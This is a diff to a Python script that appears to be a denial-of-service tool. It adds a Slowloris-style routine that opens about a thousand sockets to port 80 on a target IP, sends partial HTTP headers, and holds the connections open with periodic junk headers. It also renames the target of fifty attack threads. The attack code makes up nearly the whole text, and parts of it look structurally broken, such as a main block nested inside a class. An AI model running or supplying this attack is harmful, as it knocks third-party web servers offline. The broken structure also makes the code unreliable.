@@ -31,11 +31,69 @@ import threading
 import time
 import colorama
 from colorama import Fore
-from signal import signal, SIGINT
-from sys import exit
+import random
+import socket
+import sys
+
+# --------------------------------------------
+
+class attacker:
+    sockets = []
+    def setupSocket(ip):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(4)
+        sock.connect((ip, 80))
+        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
+        headers = [
+        "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
+        "Accept-language: en-US,en"
+        ]   
+        for header in headers:
+            sock.send("{}\r\n".format(header).encode("utf-8"))
+
+        return sock
+
+    if __name__ == "__main__":
+        if len(sys.argv) != 2:
+            print(Fore.RED+"Unknown Error"+Fore.WHITE)
+            sys.exit()
+
+        ip = sys.argv[1]
+        count = 1020
+
+        for _ in range(count):
+            try:
+                print(Fore.YELLOW+"Connecting Sockets {}".format(_))
+                sock = setupSocket(ip)
+            except socket.error:
+                break
+
+            sockets.append(sock)
+
+        while True:
+            print(Fore.GREEN+"Connected {} sockets".format(len(sockets)))
+
+            for sock in list(sockets):
+                try:
+                    sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
+                except socket.error:
+                    sockets.remove(sock)
+
+            for _ in range(count - len(sockets)):
+                try:
+                    sock = setupSocket(ip)
+                    if sock:
+                        print(Fore.RED+"HIT!"+Fore.WHITE)
+                        sockets.append(sock)
+                except socket.error:
+                    break
+
+# --------------------------------------------
 
 os.system("clear")
+
 time.sleep(1)
+
 logo = """
   ███╗   ███╗ █████╗ ██████╗ ██╗   ██╗██╗███╗   ██╗
   ████╗ ████║██╔══██╗██╔══██╗██║   ██║██║████╗  ██║
@@ -72,56 +130,56 @@ if yesno == "N":
   exit()
 
 if __name__ == "__main__":
-  t1 = threading.Thread(target=attack)
-  t2 = threading.Thread(target=attack)
-  t3 = threading.Thread(target=attack)
-  t4 = threading.Thread(target=attack)
-  t5 = threading.Thread(target=attack)
-  t6 = threading.Thread(target=attack)
-  t7 = threading.Thread(target=attack)
-  t8 = threading.Thread(target=attack)
-  t9 = threading.Thread(target=attack)
-  t10 = threading.Thread(target=attack)
-  t11 = threading.Thread(target=attack)
-  t12 = threading.Thread(target=attack)
-  t13 = threading.Thread(target=attack)
-  t14 = threading.Thread(target=attack)
-  t15 = threading.Thread(target=attack)
-  t16 = threading.Thread(target=attack)
-  t17 = threading.Thread(target=attack)
-  t18 = threading.Thread(target=attack)
-  t19 = threading.Thread(target=attack)
-  t20 = threading.Thread(target=attack)
-  t21 = threading.Thread(target=attack)
-  t22 = threading.Thread(target=attack)
-  t23 = threading.Thread(target=attack)
-  t24 = threading.Thread(target=attack)
-  t25 = threading.Thread(target=attack)
-  t26 = threading.Thread(target=attack)
-  t27 = threading.Thread(target=attack)
-  t28 = threading.Thread(target=attack)
-  t29 = threading.Thread(target=attack)
-  t30 = threading.Thread(target=attack)
-  t31= threading.Thread(target=attack)
-  t32 = threading.Thread(target=attack)
-  t33 = threading.Thread(target=attack)
-  t34 = threading.Thread(target=attack)
-  t35 = threading.Thread(target=attack)
-  t36 = threading.Thread(target=attack)
-  t37 = threading.Thread(target=attack)
-  t38 = threading.Thread(target=attack)
-  t39 = threading.Thread(target=attack)
-  t40 = threading.Thread(target=attack)
-  t41 = threading.Thread(target=attack)
-  t42 = threading.Thread(target=attack)
-  t43 = threading.Thread(target=attack)
-  t44 = threading.Thread(target=attack)
-  t45 = threading.Thread(target=attack)
-  t46 = threading.Thread(target=attack)
-  t47 = threading.Thread(target=attack)
-  t48 = threading.Thread(target=attack)
-  t49 = threading.Thread(target=attack)
-  t50 = threading.Thread(target=attack)
+  t1 = threading.Thread(target=attacker)
+  t2 = threading.Thread(target=attacker)
+  t3 = threading.Thread(target=attacker)
+  t4 = threading.Thread(target=attacker)
+  t5 = threading.Thread(target=attacker)
+  t6 = threading.Thread(target=attacker)
+  t7 = threading.Thread(target=attacker)
+  t8 = threading.Thread(target=attacker)
+  t9 = threading.Thread(target=attacker)
+  t10 = threading.Thread(target=attacker)
+  t11 = threading.Thread(target=attacker)
+  t12 = threading.Thread(target=attacker)
+  t13 = threading.Thread(target=attacker)
+  t14 = threading.Thread(target=attacker)
+  t15 = threading.Thread(target=attacker)
+  t16 = threading.Thread(target=attacker)
+  t17 = threading.Thread(target=attacker)
+  t18 = threading.Thread(target=attacker)
+  t19 = threading.Thread(target=attacker)
+  t20 = threading.Thread(target=attacker)
+  t21 = threading.Thread(target=attacker)
+  t22 = threading.Thread(target=attacker)
+  t23 = threading.Thread(target=attacker)
+  t24 = threading.Thread(target=attacker)
+  t25 = threading.Thread(target=attacker)
+  t26 = threading.Thread(target=attacker)
+  t27 = threading.Thread(target=attacker)
+  t28 = threading.Thread(target=attacker)
+  t29 = threading.Thread(target=attacker)
+  t30 = threading.Thread(target=attacker)
+  t31 = threading.Thread(target=attacker)
+  t32 = threading.Thread(target=attacker)
+  t33 = threading.Thread(target=attacker)
+  t34 = threading.Thread(target=attacker)
+  t35 = threading.Thread(target=attacker)
+  t36 = threading.Thread(target=attacker)
+  t37 = threading.Thread(target=attacker)
+  t38 = threading.Thread(target=attacker)
+  t39 = threading.Thread(target=attacker)
+  t40 = threading.Thread(target=attacker)
+  t41 = threading.Thread(target=attacker)
+  t42 = threading.Thread(target=attacker)
+  t43 = threading.Thread(target=attacker)
+  t44 = threading.Thread(target=attacker)
+  t45 = threading.Thread(target=attacker)
+  t46 = threading.Thread(target=attacker)
+  t47 = threading.Thread(target=attacker)
+  t48 = threading.Thread(target=attacker)
+  t49 = threading.Thread(target=attacker)
+  t50 = threading.Thread(target=attacker)
 if count == "1":
   t1.start()
 if count == "2":
